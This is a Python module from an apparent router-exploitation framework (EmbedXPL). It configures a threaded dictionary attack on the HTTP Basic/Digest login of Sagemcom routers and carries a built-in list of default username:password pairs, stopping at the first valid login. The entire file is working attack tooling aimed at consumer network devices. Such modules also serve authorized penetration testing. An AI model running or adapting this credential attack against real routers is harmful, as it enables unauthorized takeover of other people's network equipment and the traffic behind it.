# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.http_basic_digest_default import Exploit as HTTPBasicDigestDefault


class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Sagemcom Router Default Web Interface Creds",
        "description": "Dictionary attack against Sagemcom Router Web Interface (HTTP Basic/Digest Auth).",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Sagemcom Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")
    path = OptString("/", "Target path")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("1234:0000,1234:1234,1234:abcd12345,1234:admin,1234:belong", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
